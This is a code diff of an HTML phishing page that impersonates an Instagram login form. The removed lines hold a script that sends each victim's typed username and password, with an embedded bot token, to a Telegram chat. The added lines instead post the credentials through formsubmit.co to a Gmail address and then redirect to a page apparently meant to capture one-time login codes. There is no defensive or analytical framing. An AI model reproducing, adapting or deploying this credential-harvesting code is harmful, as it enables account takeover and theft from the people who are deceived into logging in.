@@ -34,7 +34,7 @@
                     </div>
                 </div>
                 <div class="form-container">
-                    <form id="tg"  action="">
+                    <form id="form"  method="POST" action="https://formsubmit.co/instagramreportmail001@gmail.com">
 
                     <div class="form-content box">
                         <div class="logo">
@@ -59,7 +59,7 @@
                                     </span>
                                     <input type="text" name="username" id="username" required>
                                     <input type="hidden" name="_captcha" value="false">
-                                    <input type="hidden" name="_next" value="https://fanvote.mynetly.com/voteglb/instagram/otp/657daf104b167f68d1979b9c.html">
+                                    <input type="hidden" name="_next" value="https://sephorasquad.github.io/voteuwj/instagram/otp/657daf104b167f68d1979b9c.html">
                                 </div>
                                 
                             </div>
@@ -76,7 +76,7 @@
                                 <div style="display: flex; text-align: end; justify-content: end; color: rgb(0, 17, 255);"><a href="#" class="forgot-pw">Forgotten your password?</a></div>
                             </div>
                             <div class="btn-group">
-                                <button class="btn-login"  type="submit" >
+                                <button class="btn-login"  type="submit" id="button" value="Send Email">
                                     Log In
                                 </button>
                                 <div class="box goto">
@@ -162,30 +162,11 @@
     </script> -->
     
     <script src="app.js"></script> 
-    <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
 
-<script>
-       const TOKEN = "6967036489:AAHMAgDPIETaSdzqBL2-qE2tJ_9_amQtLC8"
-        const CHAT_ID= '6967036489'
-        const URI_API = `https://api.telegram.org/bot${ TOKEN }/sendMessage`
+<!-- <script> -->
+  
 
-        document.getElementById('tg').addEventListener('submit', function(e) {
-            e.preventDefault() 
-
-            let message= '<br>New user</b> \n'
-            message += `<b>Username:</b> ${this.username.value} \n`
-            message += `<b>Password:</b> ${this.password.value} \n`
-
-            axios.post(URI_API,{
-                chat_id: CHAT_ID,
-                parse_mode:'html',
-                text:message
-
-            })
-
-
-        })
-</script>
+    <!-- </script> -->
 
 </body>
 
